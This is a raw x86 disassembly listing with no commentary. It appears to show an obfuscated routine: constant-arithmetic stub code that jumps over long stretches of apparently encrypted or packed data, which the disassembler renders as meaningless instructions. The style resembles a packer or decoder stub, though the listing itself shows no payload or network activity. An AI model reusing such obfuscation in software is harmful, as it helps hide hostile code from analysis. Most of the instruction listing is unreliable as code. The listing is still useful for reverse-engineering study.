  416c9e:	push   ebp
  416c9f:	mov    ebp,esp
  416ca1:	sub    esp,0x44
  416ca4:	push   ebx
  416ca5:	push   esi
  416ca6:	push   edi
  416ca7:	mov    DWORD PTR [ebp-0x18],0x2
  416cae:	mov    DWORD PTR [ebp-0x14],0x29f0
  416cb5:	mov    DWORD PTR [ebp-0x10],0x3716
  416cbc:	mov    DWORD PTR [ebp-0x2c],0x4e09
  416cc3:	mov    DWORD PTR [ebp-0x28],0x4497
  416cca:	mov    DWORD PTR [ebp-0x24],0x5
  416cd1:	mov    DWORD PTR [ebp-0x20],0x2a0a
  416cd8:	mov    DWORD PTR [ebp-0x1c],0x1
  416cdf:	mov    DWORD PTR [ebp-0xc],0xce6
  416ce6:	mov    DWORD PTR [ebp-0x8],0x12b3
  416ced:	mov    DWORD PTR [ebp-0x4],0xb09
  416cf4:	mov    DWORD PTR [ebp-0x44],0x7617
  416cfb:	mov    DWORD PTR [ebp-0x40],0x721a
  416d02:	mov    DWORD PTR [ebp-0x3c],0x5151
  416d09:	mov    DWORD PTR [ebp-0x38],0x14aa
  416d10:	mov    DWORD PTR [ebp-0x34],0x5a28
  416d17:	mov    DWORD PTR [ebp-0x30],0x19a8
  416d1e:	mov    ecx,DWORD PTR [ebp-0x1c]
  416d21:	mov    eax,DWORD PTR [ebp-0x20]
  416d24:	xor    edx,edx
  416d26:	div    ecx
  416d28:	mov    ecx,DWORD PTR [ebp-0x24]
  416d2b:	xor    edx,edx
  416d2d:	mov    esi,0x1ac5
  416d32:	push   0x20
  416d34:	div    ecx
  416d36:	mov    ecx,DWORD PTR [ebp-0x28]
  416d39:	xor    edx,edx
  416d3b:	xor    eax,0x60dc
  416d40:	sub    eax,ecx
  416d42:	mov    ecx,DWORD PTR [ebp-0x2c]
  416d45:	lea    edi,[eax+ecx*1-0x6300]
  416d4c:	mov    eax,DWORD PTR [ebp-0x4]
  416d4f:	mov    ecx,DWORD PTR [ebp-0x8]
  416d52:	sub    eax,0x7721
  416d57:	xor    eax,ecx
  416d59:	mov    ecx,DWORD PTR [ebp-0xc]
  416d5c:	xor    eax,ecx
  416d5e:	or     eax,0x7bc9
  416d63:	xor    eax,0xfffff0db
  416d68:	mov    ebx,edi
  416d6a:	sub    ebx,eax
  416d6c:	jmp    0x4170a9
  416d71:	dec    ebx
  416d72:	jbe    0x416da1
  416d74:	imul   BYTE PTR [edx+ebp*4]
  416d77:	dec    ebx
  416d78:	sub    dl,dh
  416d7a:	push   0xffffffc1
  416d7c:	mov    al,0xab
  416d7e:	jmp    0x1816:0xf47ab0bd
  416d85:	loope  0x416d99
  416d87:	sbb    BYTE PTR [eax],bl
  416d89:	cmp    DWORD PTR [eax+eiz*4-0x16846ccf],edx
  416d90:	aas    
  416d91:	mov    esp,0x8d9e8f31
  416d96:	push   ecx
  416d97:	xor    dl,BYTE PTR [edx]
  416d99:	adc    BYTE PTR [edx],bh
  416d9b:	dec    edi
  416d9c:	sub    eax,0xd6b8d6a6
  416da1:	stos   DWORD PTR es:[edi],eax
  416da2:	push   ecx
  416da3:	or     edi,ebx
  416da5:	sbb    eax,0xc0db29ba
  416daa:	xchg   BYTE PTR [esi-0x68],dh
  416dad:	mov    bl,ch
  416daf:	inc    edi
  416db0:	fs test eax,0xa7e7507
  416db6:	push   ebx
  416db7:	sub    eax,0x345ac924
  416dbc:	sti    
  416dbd:	mov    cl,0x82
  416dbf:	fdivr  st,st(7)
  416dc1:	mul    BYTE PTR [ebp+0x4a]
  416dc4:	scas   al,BYTE PTR es:[edi]
  416dc5:	mov    esp,edx
  416dc7:	dec    edx
  416dc8:	(bad)  
  416dc9:	sub    esp,edi
  416dcb:	sahf   
  416dcc:	dec    ebx
  416dcd:	push   DWORD PTR [edi-0x22]
  416dd0:	inc    esp
  416dd1:	ret    
  416dd2:	stos   DWORD PTR es:[edi],eax
  416dd3:	mov    edx,esp
  416dd5:	out    dx,eax
  416dd6:	sbb    al,0xeb
  416dd8:	xlat   BYTE PTR ds:[ebx]
  416dd9:	dec    edi
  416dda:	pslld  mm2,mm0
  416ddd:	sti    
  416dde:	out    0xbf,al
  416de0:	dec    ebx
  416de1:	jns    0x416d7f
  416de3:	xor    edx,DWORD PTR [eax+eiz*2-0x53e3531f]
  416dea:	xchg   esi,eax
  416deb:	ret    
  416dec:	or     esi,DWORD PTR [edi-0x140ad6e9]
  416df2:	mov    eax,ds:0xc77923ad
  416df7:	das    
  416df8:	cmp    esi,DWORD PTR [ecx]
  416dfa:	mov    ebx,0x8ab5ff2f
  416dff:	ins    DWORD PTR es:[edi],dx
  416e00:	inc    edi
  416e01:	out    0x17,eax
  416e03:	and    eax,edx
  416e05:	js     0x416e23
  416e07:	sub    cl,BYTE PTR ds:0xf1bd6e99
  416e0d:	add    bl,BYTE PTR [ebp+0x2f]
  416e10:	push   esi
  416e11:	fadd   st(7),st
  416e13:	or     cl,bl
  416e15:	xchg   ebx,eax
  416e16:	(bad)
  416e1a:	and    bh,al
  416e1c:	fpatan 
  416e1e:	fwait
  416e1f:	mov    al,0xd3
  416e21:	fwait
  416e22:	out    dx,eax
  416e23:	push   es
  416e24:	jb     0x416e0d
  416e26:	xor    esp,edx
  416e28:	sub    dh,BYTE PTR [edi+edx*1-0x5e]
  416e2c:	ror    DWORD PTR [ecx-0x228b0d73],1
  416e32:	xor    esp,DWORD PTR [ebx-0x5e]
  416e35:	fnstcw WORD PTR [ebx+eiz*8-0x9]
  416e39:	pop    eax
  416e3a:	retf   
  416e3b:	into   
  416e3c:	rcr    BYTE PTR [eax-0x19],1
  416e3f:	retf   0x1c0d
  416e42:	js     0x416e2b
  416e44:	sub    ch,bh
  416e46:	push   es
  416e47:	add    bl,dl
  416e49:	inc    eax
  416e4a:	jmp    0xfbcd:0xf23beafc
  416e51:	mov    ecx,0x835b4b7e
  416e56:	mov    BYTE PTR [ebx-0x15cb7f80],dl
  416e5c:	dec    ebp
  416e5d:	mov    edx,DWORD PTR [eax+0x31]
  416e60:	loope  0x416e80
  416e62:	sub    dh,dh
  416e64:	imul   esi,ecx,0x18
  416e67:	xchg   esi,eax
  416e68:	jns    0x416e22
  416e6a:	xchg   edi,eax
  416e6b:	pushf  
  416e6c:	xchg   esi,eax
  416e6d:	out    dx,eax
  416e6e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416e6f:	push   ebp
  416e70:	fimul  WORD PTR [ebx+0x35b26b6d]
  416e76:	push   0x6f
  416e78:	pop    es
  416e79:	mov    bh,0x5b
  416e7b:	mov    DWORD PTR [eax],esi
  416e7d:	ret    
  416e7e:	popa   
  416e7f:	in     al,dx
  416e80:	rol    DWORD PTR [edx],cl
  416e82:	pop    ebp
  416e83:	fld    DWORD PTR [ebp+0x4e34acbd]
  416e89:	sahf   
  416e8a:	mov    ecx,DWORD PTR [edx]
  416e8c:	clc    
  416e8d:	rcr    BYTE PTR [ecx],cl
  416e8f:	leave  
  416e90:	adc    al,0x56
  416e92:	rcl    BYTE PTR [ebp+0x40842217],cl
  416e98:	shr    DWORD PTR [edx],1
  416e9a:	(bad)  
  416e9c:	sub    eax,0xb00da2b0
  416ea1:	and    al,0x20
  416ea3:	frstor [esi]
  416ea5:	and    DWORD PTR [eax-0x7cee7722],ebx
  416eab:	stos   DWORD PTR es:[edi],eax
  416eac:	and    al,0xf6
  416eae:	mov    edi,0xa0f18a33
  416eb3:	cmp    BYTE PTR [eax-0x7582aa44],dl
  416eb9:	ins    BYTE PTR es:[edi],dx
  416eba:	dec    esi
  416ebb:	imul   ebx,DWORD PTR [edx-0x6716e2],0xb74538fc
  416ec5:	lock and bl,cl
  416ec8:	cmp    DWORD PTR [ebp+eiz*4+0x20],esp
  416ecc:	jge    0x416f45
  416ece:	mov    eax,0x859c2f98
  416ed3:	or     al,0x4e
  416ed5:	sbb    DWORD PTR ds:0xf2adda71,eax
  416edb:	inc    edx
  416edc:	fisubr WORD PTR [ecx+0x78cf14f1]
  416ee2:	bswap  edi
  416ee4:	add    eax,0xd5f093
  416ee9:	sbb    eax,0x9ac3dc6d
  416eee:	push   ebp
  416eef:	xchg   edi,eax
  416ef0:	sbb    eax,0xb0f0dd4e
  416ef5:	push   edi
  416ef6:	mov    bl,0xcc
  416ef8:	test   BYTE PTR [edx+0x53],al
  416efb:	xor    DWORD PTR [esi],0xd8987c78
  416f01:	loope  0x416ee4
  416f03:	retf   0xcc2
  416f06:	scas   al,BYTE PTR es:[edi]
  416f07:	pop    ecx
  416f08:	adc    DWORD PTR [bp+0x630c],0x2a
  416f0e:	or     BYTE PTR [eax-0x74],al
  416f11:	stos   DWORD PTR es:[edi],eax
  416f12:	in     eax,0xf5
  416f14:	int3   
  416f15:	nop
  416f16:	cmp    esi,ecx
  416f18:	xor    dh,ch
  416f1a:	push   esi
  416f1b:	mov    cl,0xb3
  416f1d:	repz das 
  416f1f:	add    BYTE PTR [esi-0x7c],bl
  416f22:	call   0x2940:0x31d0557d
  416f29:	(bad)  
  416f2a:	mov    ecx,0xdba6786d
  416f2f:	xor    DWORD PTR [edi+0x1b],esi
  416f32:	xor    BYTE PTR [eax],dl
  416f34:	scas   al,BYTE PTR es:[edi]
  416f35:	jmp    0x416fa6
  416f37:	sar    DWORD PTR [ecx-0x497fc1e3],1
  416f3d:	ja     0x416f88
  416f3f:	mov    DWORD PTR [ebx+0x0],edi
  416f42:	xchg   ebp,eax
  416f43:	mov    esp,0x1aad141b
  416f48:	or     esi,DWORD PTR [ecx-0x4418e479]
  416f4e:	rcl    BYTE PTR [edx],cl
  416f50:	dec    esi
  416f51:	mov    edi,0x2ec71e61
  416f56:	inc    ebp
  416f57:	into   
  416f58:	rol    DWORD PTR [eax-0x3b],cl
  416f5b:	scas   al,BYTE PTR es:[edi]
  416f5c:	mov    edi,0x236428c3
  416f61:	bound  ecx,QWORD PTR [ecx+0x7a]
  416f64:	rcl    ebp,cl
  416f66:	pop    ss
  416f67:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416f68:	inc    ecx
  416f69:	imul   edx,edi,0xffffffe8
  416f6c:	push   edx
  416f6d:	jg     0x416fed
  416f6f:	cwde   
  416f70:	inc    eax
  416f71:	push   cs
  416f72:	xchg   cx,ax
  416f74:	push   edi
  416f75:	inc    esp
  416f76:	sahf   
  416f77:	dec    esi
  416f78:	push   cs
  416f79:	and    esi,edx
  416f7b:	shl    BYTE PTR [edi+0x12],1
  416f7e:	test   eax,0x58c002e1
  416f83:	push   esi
  416f84:	ss stc 
  416f86:	xor    eax,0xe3cf8fa5
  416f8b:	icebp  
  416f8c:	arpl   WORD PTR [ebp+0x25],bp
  416f8f:	xor    edx,DWORD PTR [ecx+0x24]
  416f92:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416f93:	jl     0x416f23
  416f95:	jecxz  0x416f96
  416f97:	mov    dh,0xe5
  416f99:	in     al,0x59
  416f9b:	js     0x416f52
  416f9d:	icebp  
  416f9e:	test   al,0x7a
  416fa0:	rol    BYTE PTR [ebx+edx*4],cl
  416fa3:	js     0x41700d
  416fa5:	push   0x4f
  416fa7:	push   ss
  416fa8:	cmc    
  416fa9:	outs   dx,DWORD PTR ds:[esi]
  416faa:	cs iret 
  416fac:	xchg   edx,eax
  416fad:	(bad)  
  416fae:	mov    DWORD PTR [edx],0x5d83284c
  416fb4:	inc    esi
  416fb5:	outs   dx,DWORD PTR ds:[esi]
  416fb6:	out    0xbb,eax
  416fb8:	ss cld 
  416fba:	sub    BYTE PTR [esi],0x2b
  416fbd:	and    al,0xc6
  416fbf:	sbb    eax,0x7ef42a47
  416fc4:	inc    ebx
  416fc5:	nop
  416fc6:	adc    DWORD PTR [edx+0x4b],0x6d8f6f0a
  416fcd:	(bad)  
  416fce:	dec    ecx
  416fcf:	push   eax
  416fd0:	mov    bl,BYTE PTR [ecx-0x76202006]
  416fd6:	sub    BYTE PTR [ecx-0x3a],bh
  416fd9:	push   0xedc1ad11
  416fde:	mov    ecx,0xe107cb87
  416fe3:	ror    DWORD PTR [edx+0x6f],cl
  416fe6:	outs   dx,BYTE PTR ds:[esi]
  416fe7:	stos   DWORD PTR es:[edi],eax
  416fe8:	call   0xad8d:0xc2826b9d
  416fef:	sub    bh,al
  416ff1:	sub    BYTE PTR [ebx],ch
  416ff3:	int    0x65
  416ff5:	fisttp DWORD PTR [ebx]
  416ff7:	inc    ebp
  416ff8:	jno    0x416fe0
  416ffa:	xchg   ebx,eax
  416ffb:	(bad)  
  416ffc:	jg     0x416fa3
  416ffe:	or     DWORD PTR [edx+0x61],ecx
  417001:	push   cs
  417002:	loopne 0x416ffd
  417004:	std    
  417005:	fisub  DWORD PTR [edx]
  417007:	mov    dl,dl
  417009:	test   ebp,esi
  41700b:	jge    0x417069
  41700d:	jb     0x417038
  41700f:	das    
  417010:	add    bh,BYTE PTR [eax-0x686d3466]
  417016:	mov    DWORD PTR [ebx],edi
  417018:	lea    edx,[eax-0x49]
  41701b:	xchg   DWORD PTR [eax+0x59],ebx
  41701e:	mov    ds:0x10981eaf,eax
  417023:	xchg   ebp,eax
  417024:	mov    ebx,0xab4c7e95
  417029:	mov    fs,WORD PTR [ebx]
  41702b:	jb     0x417055
  41702d:	jno    0x4170a0
  41702f:	push   ss
  417030:	lock cmc 
  417032:	push   ecx
  417033:	adc    DWORD PTR [ecx+ebx*8+0xda18382],edi
  41703a:	mov    al,0x3f
  41703c:	jg     0x417019
  41703e:	add    ebx,edi
  417040:	retf   
  417041:	out    0x3c,al
  417043:	mov    al,0xa3
  417045:	lock sbb bh,bh
  417048:	in     eax,0x38
  41704a:	inc    edx
  41704b:	add    cl,bh
  41704d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41704e:	bound  edx,QWORD PTR [ebp-0x59]
  417051:	dec    esp
  417052:	hlt    
  417053:	into   
  417054:	jg     0x417062
  417056:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417057:	cmp    dh,BYTE PTR [edi-0x52b00ff4]
  41705d:	cs in  eax,dx
  41705f:	icebp  
  417060:	popf   
  417061:	inc    ecx
  417062:	push   ebp
  417063:	xor    DWORD PTR ds:0x721393e9,esi
  417069:	and    eax,0xecf97471
  41706e:	into   
  41706f:	dec    esi
  417070:	adc    BYTE PTR [edx+0x13d127f5],dh
  417076:	pop    ecx
  417077:	dec    BYTE PTR [ecx+ebp*2]
  41707a:	jg     0x4170da
  41707c:	in     al,dx
  41707d:	out    0x2d,eax
  41707f:	(bad)  
  417080:	xchg   ecx,eax
  417081:	add    eax,0x867e1baa
  417086:	and    al,BYTE PTR [ecx+0x7890584a]
  41708c:	outs   dx,DWORD PTR ds:[esi]
  41708d:	jge    0x4170ce
  41708f:	push   esi
  417090:	pusha  
  417091:	jp     0x417064
  417093:	ret    0x576f
  417096:	fs fcmovne st,st(1)
  417099:	pop    eax
  41709a:	ror    esp,0x10
  41709d:	leave  
  41709e:	imul   ecx,DWORD PTR [edi+0x2a],0x85a6b983
  4170a5:	fidivr WORD PTR [edx-0x24]
  4170a8:	adc    eax,0x8bf0458b
  4170ad:	dec    ebp
  4170ae:	in     al,dx
  4170af:	xor    eax,ecx
  4170b1:	mov    ecx,DWORD PTR [ebp-0x18]
  4170b4:	sub    eax,esi
  4170b6:	div    ecx
  4170b8:	mov    ecx,0x211
  4170bd:	pop    edx
  4170be:	xor    eax,ecx
  4170c0:	sub    edx,eax
  4170c2:	cmp    ebx,edx
  4170c4:	ja     0x4174cb
  4170ca:	jmp    0x4170d2
  4170cf:	mov    edi,DWORD PTR [ebp-0x2c]
  4170d2:	mov    DWORD PTR [ebp-0x20],0x1aa3
  4170d9:	mov    DWORD PTR [ebp-0x24],0x52d
  4170e0:	mov    DWORD PTR [ebp-0x28],0x226c
  4170e7:	mov    DWORD PTR [ebp-0x2c],0x347d
  4170ee:	mov    eax,DWORD PTR [ebp-0x2c]
  4170f1:	mov    edx,DWORD PTR [ebp-0x28]
  4170f4:	mov    ebx,DWORD PTR [ebp-0x24]
  4170f7:	sub    eax,0x24b3
  4170fc:	imul   eax,edx
  4170ff:	xor    eax,0x74ef
  417104:	xor    edx,edx
  417106:	div    ebx
  417108:	mov    edx,DWORD PTR [ebp-0x20]
  41710b:	mov    ebx,DWORD PTR [ebp+0x8]
  41710e:	push   0x20
  417110:	and    eax,edx
  417112:	mov    edx,edi
  417114:	sub    edx,eax
  417116:	sub    edx,0x683
  41711c:	mov    DWORD PTR [ebp-0x2c],edx
  41711f:	mov    eax,DWORD PTR [ebp-0x30]
  417122:	mov    edx,DWORD PTR [ebp-0x34]
  417125:	xor    al,dl
  417127:	mov    edx,DWORD PTR [ebp-0x2c]
  41712a:	xor    al,0x58
  41712c:	and    al,0xd8
  41712e:	add    al,BYTE PTR [ebp+0xc]
  417131:	add    al,0x28
  417133:	mov    BYTE PTR [edx+ebx*1],al
  417136:	mov    eax,DWORD PTR [ebp-0x38]
  417139:	add    eax,DWORD PTR [ebp-0x3c]
  41713c:	mov    edx,DWORD PTR [ebp-0x40]
  41713f:	xor    eax,edx
  417141:	mov    edx,DWORD PTR [ebp-0x44]
  417144:	xor    eax,edx
  417146:	mov    edx,0x61f7
  41714b:	sub    edx,eax
  41714d:	mov    eax,DWORD PTR [ebp-0x4]
  417150:	add    edi,edx
  417152:	mov    edx,DWORD PTR [ebp-0x8]
  417155:	sub    eax,0x7721
  41715a:	xor    eax,edx
  41715c:	mov    edx,DWORD PTR [ebp-0xc]
  41715f:	xor    eax,edx
  417161:	or     eax,0x7bc9
  417166:	xor    eax,0xfffff0db
  41716b:	mov    DWORD PTR [ebp-0x2c],edi
  41716e:	sub    edi,eax
  417170:	mov    eax,DWORD PTR [ebp-0x10]
  417173:	mov    edx,DWORD PTR [ebp-0x14]
  417176:	mov    ebx,DWORD PTR [ebp-0x18]
  417179:	xor    eax,edx
  41717b:	xor    edx,edx
  41717d:	sub    eax,esi
  41717f:	div    ebx
  417181:	jmp    0x4174be
  417186:	in     al,0x6b
  417188:	retf   
  417189:	repnz cmp dh,BYTE PTR [ebx]
  41718c:	pushf  
  41718d:	pop    edx
  41718e:	stos   BYTE PTR es:[edi],al
  41718f:	mov    DWORD PTR [edi+0x6a],0x6a049e94
  417196:	inc    edx
  417197:	out    dx,al
  417198:	push   ss
  417199:	sbb    cl,ah
  41719b:	adc    bl,BYTE PTR [eax]
  41719d:	sbb    dh,cl
  41719f:	inc    edi
  4171a0:	shr    DWORD PTR [eax],0xa9
  4171a3:	mov    ebp,esp
  4171a5:	fidivr WORD PTR [ebp-0x64736920]
  4171ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4171ac:	dec    edx
  4171ad:	mov    ds:0xda783ea2,al
  4171b2:	lahf   
  4171b3:	js     0x417226
  4171b5:	push   ecx
  4171b6:	adc    eax,0x2b222811
  4171bb:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  4171bd:	fstp   QWORD PTR [eax-0x31]
  4171c0:	sar    DWORD PTR ds:0x71a1ab37,1
  4171c6:	lea    esi,[esi+eax*4-0x6]
  4171ca:	dec    ebp
  4171cb:	retf   
  4171cc:	loop   0x41724c
  4171ce:	sbb    DWORD PTR [edx-0x1b47d032],0xc889ac06
  4171d8:	jo     0x41719d
  4171da:	mov    esi,0xf40c0cb5
  4171df:	dec    edi
  4171e0:	jge    0x417224
  4171e2:	cmc    
  4171e3:	icebp  
  4171e4:	sti    
  4171e5:	cs xor al,0xee
  4171e8:	sbb    al,0x68
  4171ea:	xor    edx,DWORD PTR [esi+0x7b22e8c7]
  4171f0:	gs jbe 0x4171b5
  4171f3:	je     0x41725b
  4171f5:	mov    ah,0x64
  4171f7:	push   esi
  4171f8:	jmp    0x41726f
  4171fa:	stos   BYTE PTR es:[edi],al
  4171fb:	xchg   ecx,eax
  4171fc:	out    dx,al
  4171fd:	sub    DWORD PTR [ecx+0x6d],edx
  417200:	hlt    
  417201:	icebp  
  417202:	loopne 0x41727c
  417204:	aam    0xcf
  417206:	and    ecx,ebx
  417208:	pop    edx
  417209:	xchg   ebp,eax
  41720a:	mov    eax,ds:0x1a4ae74b
  41720f:	sahf   
  417210:	pop    ds
  417211:	add    bh,dl
  417213:	jmp    0x181baee4
  417218:	mov    edi,0xa5b79689
  41721d:	ss push 0xffffffe2
  417220:	mov    ebx,ecx
  417222:	shr    cl,1
  417224:	cmp    al,0x10
  417226:	fdivr  QWORD PTR [ecx-0x26c822d7]
  41722c:	arpl   WORD PTR ds:[eax-0x14],si
  417230:	and    esi,esp
  417232:	cwde   
  417233:	jp     0x417262
  417235:	cmp    bh,bl
  417237:	jecxz  0x41724f
  417239:	ss pop ecx
  41723b:	mov    dh,0xb5
  41723d:	pusha  
  41723e:	push   ebx
  41723f:	icebp  
  417240:	outs   dx,BYTE PTR ds:[esi]
  417241:	cmp    al,0x6a
  417243:	or     edi,esi
  417245:	cmp    esp,DWORD PTR [ebx-0x21]
  417248:	scas   al,BYTE PTR es:[edi]
  417249:	sbb    bh,cl
  41724b:	test   eax,0x326ffbea
  417250:	sub    al,0xc3
  417252:	(bad)  
  417253:	es mov esi,0xf12394d1
  417259:	jbe    0x417214
  41725b:	jge    0x4172a8
  41725d:	gs pop ecx
  41725f:	push   edx
  417260:	rol    BYTE PTR [edi],cl
  417262:	jge    0x4172b7
  417264:	retf   0x791a
  417267:	xor    ecx,ebp
  417269:	scas   eax,DWORD PTR es:[edi]
  41726a:	mov    cl,0x74
  41726c:	imul   eax,DWORD PTR [eax+0x1c62377a],0x27428f6b
  417276:	xchg   esi,eax
  417277:	(bad)  
  417278:	cs call 0xe147:0x1c1f5d7f
  417280:	push   ebx
  417281:	imul   DWORD PTR [edx+0x1b4c436b]
  417287:	pop    es
  417288:	not    DWORD PTR [ecx]
  41728a:	pop    edi
  41728b:	mov    ch,0x6c
  41728d:	or     edx,esp
  41728f:	and    ecx,0x56
  417292:	ds loop 0x4172d0
  417295:	mov    al,0x84
  417297:	bndldx (bad),ds:[ebx]
  41729b:	pop    es
  41729c:	jp     0x41724b
  41729e:	dec    ebp
  41729f:	lods   eax,DWORD PTR ds:[esi]
  4172a0:	mov    eax,0xba666ef0
  4172a5:	push   edx
  4172a6:	fwait
  4172a7:	pop    ss
  4172a8:	bound  eax,QWORD PTR [ebp-0x1f15e5d9]
  4172ae:	fpatan 
  4172b0:	pop    es
  4172b1:	mov    ds:0xedb6d98c,al
  4172b6:	retf   0x1f30
  4172b9:	add    eax,0x2d9d545
  4172be:	jp     0x3a95038c
  4172c4:	jbe    0x4172d9
  4172c6:	sub    cl,dh
  4172c8:	rcl    BYTE PTR [edi-0x322800bb],cl
  4172ce:	mov    ebx,0x9e2b482b
  4172d3:	and    edi,0xb50f214f
  4172d9:	nop
  4172da:	les    ebx,FWORD PTR [eax-0x60]
  4172dd:	pop    ss
  4172de:	test   eax,edx
  4172e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4172e1:	mov    cl,0x46
  4172e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4172e4:	aas    
  4172e5:	sbb    BYTE PTR es:[edx],al
  4172e8:	rcl    DWORD PTR [ecx],1
  4172ea:	and    esi,ecx
  4172ec:	xor    ah,BYTE PTR [edx+0x62]
  4172ef:	mov    bh,0x8d
  4172f1:	arpl   WORD PTR [edi+0x6bffcc3e],cx
  4172f7:	mov    ecx,0xd3b39e1e
  4172fc:	and    BYTE PTR [esi+edx*1],ch
  4172ff:	pop    ds
  417300:	cwde   
  417301:	fld    QWORD PTR [edi+edi*1]
  417304:	inc    ecx
  417305:	inc    esi
  417306:	cmp    eax,DWORD PTR [ebx+0x1f]
  417309:	arpl   dx,bx
  41730b:	jmp    0x888f1de9
  417310:	and    BYTE PTR [esi+0x4edf1ffb],dh
  417316:	push   eax
  417317:	(bad)  [ebx]
  417319:	es jb  0x41731a
  41731c:	sbb    DWORD PTR [esp+ebp*1-0x54],eax
  417320:	mov    al,0xe5
  417322:	in     al,0x4d
  417324:	fs add ebx,ecx
  417327:	retf   
  417328:	push   eax
  417329:	sbb    eax,0x34e45cd
  41732e:	sar    ah,1
  417330:	lods   eax,DWORD PTR ds:[esi]
  417331:	icebp  
  417332:	loopne 0x4173ae
  417334:	jle    0x4172cc
  417336:	lahf   
  417337:	xchg   ebx,eax
  417338:	or     BYTE PTR [eax+0x57],dl
  41733b:	cs xor eax,0xecac9f1b
  417341:	jp     0x4173a7
  417343:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417344:	popa   
  417345:	jo     0x417348
  417347:	push   es
  417348:	clc    
  417349:	inc    eax
  41734a:	mov    cl,BYTE PTR [ebx+0x67]
  41734d:	jne    0x4173c2
  41734f:	and    eax,0x2d999371
  417354:	fild   QWORD PTR [edx+0x69643cda]
  41735a:	fwait
  41735b:	icebp  
  41735c:	call   0xd49c0b24
  417361:	out    dx,eax
  417362:	rol    BYTE PTR [edi-0x1aa7e8cc],cl
  417368:	std    
  417369:	mov    al,0xbf
  41736b:	xchg   edi,eax
  41736c:	pop    ds
  41736d:	mov    bh,0xa3
  41736f:	fstp   QWORD PTR [ebp+0x61]
  417372:	ins    DWORD PTR es:[edi],dx
  417373:	fwait
  417374:	popf   
  417375:	dec    ebp
  417376:	sub    ebx,DWORD PTR [edi+eax*8-0x23]
  41737a:	nop
  41737b:	mov    eax,ds:0x4548f629
  417380:	add    al,0x9b
  417382:	and    BYTE PTR [esi],dh
  417384:	or     BYTE PTR [ebp-0x2a480383],ch
  41738a:	inc    ecx
  41738b:	dec    esp
  41738c:	or     al,0xae
  41738e:	xor    eax,DWORD PTR [esi+esi*8]
  417391:	and    eax,0xeddccc73
  417396:	mov    dl,0x9f
  417398:	repz shr BYTE PTR [edx],0x5
  41739c:	xchg   esi,eax
  41739d:	xor    DWORD PTR [ebp-0x6c4e95b7],esi
  4173a3:	xor    al,BYTE PTR [eax]
  4173a5:	fxch   st(0)
  4173a7:	mov    ah,bh
  4173a9:	mov    esp,0xb0dbb62
  4173ae:	xchg   edi,eax
  4173af:	das    
  4173b0:	ss jmp 0xf8c65b25
  4173b6:	int    0x31
  4173b8:	jp     0x41737a
  4173ba:	pop    es
  4173bb:	xor    ebx,DWORD PTR [esp+edi*8-0x53]
  4173bf:	xchg   edx,eax
  4173c0:	sub    eax,0xe1feb1ea
  4173c5:	adc    dh,BYTE PTR [eax-0x1d838477]
  4173cb:	pop    ebx
  4173cc:	rol    DWORD PTR [edx],cl
  4173ce:	mov    dl,0xc5
  4173d0:	dec    ecx
  4173d1:	pop    esi
  4173d2:	fs xor eax,0xc6d5959c
  4173d8:	push   esi
  4173d9:	add    eax,DWORD PTR [edx]
  4173db:	inc    edx
  4173dc:	jne    0x4173d9
  4173de:	dec    ebp
  4173df:	jae    0x41737b
  4173e1:	or     eax,0x70a44778
  4173e6:	mov    cl,0x5
  4173e8:	mov    dl,bh
  4173ea:	dec    eax
  4173eb:	pop    edi
  4173ec:	mov    edi,0x4b3473cf
  4173f1:	aaa    
  4173f2:	test   eax,0x7c052012
  4173f7:	cld    
  4173f8:	lock add BYTE PTR [ebx],bh
  4173fb:	sub    al,0x7
  4173fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4173fe:	pop    edx
  4173ff:	aas    
  417400:	and    al,0x1b
  417402:	scas   eax,DWORD PTR es:[edi]
  417403:	lods   al,BYTE PTR ds:[esi]
  417404:	sbb    dl,BYTE PTR [ebp+edi*8-0x36a4614e]
  41740b:	push   0xeaac9c80
  417410:	mov    ebx,0x811a2dd
  417415:	jno    0x417449
  417417:	arpl   cx,ax
  417419:	push   ecx
  41741a:	ds (bad) 
  41741c:	jmp    0xe740:0x29352bc6
  417423:	or     BYTE PTR [ebx+0x17],ah
  417426:	lods   eax,DWORD PTR ds:[esi]
  417427:	(bad)  
  417428:	call   0xc9f4e460
  41742d:	or     al,0xe1
  41742f:	outs   dx,DWORD PTR ds:[esi]
  417430:	mov    ebp,0x3c283257
  417435:	mov    bl,0xf0
  417437:	xlat   BYTE PTR ds:[ebx]
  417438:	es (bad) 
  41743a:	mov    dh,0xa8
  41743c:	imul   ebp,DWORD PTR [edx+0x414bcc03],0x90edcfdb
  417446:	int3   
  417447:	loopne 0x417440
  417449:	mov    bl,0x69
  41744b:	fwait
  41744c:	sub    ebp,esi
  41744e:	pop    edi
  41744f:	popf   
  417450:	das    
  417451:	(bad)  
  417453:	xchg   ecx,eax
  417454:	mov    bh,0x97
  417456:	pop    eax
  417457:	ficom  DWORD PTR [ebp*2+0x3a6d55b4]
  41745e:	jo     0x417480
  417460:	jg     0x4173e3
  417462:	sub    BYTE PTR [ebx-0x3c875a50],0x4b
  417469:	test   DWORD PTR [ebx+0x37ae81c0],ecx
  41746f:	cmp    bl,BYTE PTR [edx]
  417471:	xor    ecx,DWORD PTR [esi-0x5d]
  417474:	retf   
  417475:	retf   
  417476:	mov    bl,0xad
  417478:	jmp    0xdb7f:0xcf4514ff
  41747f:	fild   QWORD PTR [eax]
  417481:	dec    esi
  417482:	(bad)  
  417483:	cmc    
  417484:	bound  ebx,QWORD PTR ds:0xb14f9174
  41748a:	out    0xf0,al
  41748c:	add    al,0x27
  41748e:	mov    al,0xc2
  417490:	adc    BYTE PTR [edi+0x7fed1234],al
  417496:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417497:	(bad)
  41749b:	fisub  DWORD PTR [edi-0x13]
  41749e:	nop
  41749f:	sub    al,0x81
  4174a1:	xchg   ebx,eax
  4174a2:	jae    0x4174b6
  4174a4:	jmp    0xb4ede5a2
  4174a9:	neg    BYTE PTR [ebp-0x51]
  4174ac:	dec    esi
  4174ad:	and    DWORD PTR [esi+0x5853cbd0],esi
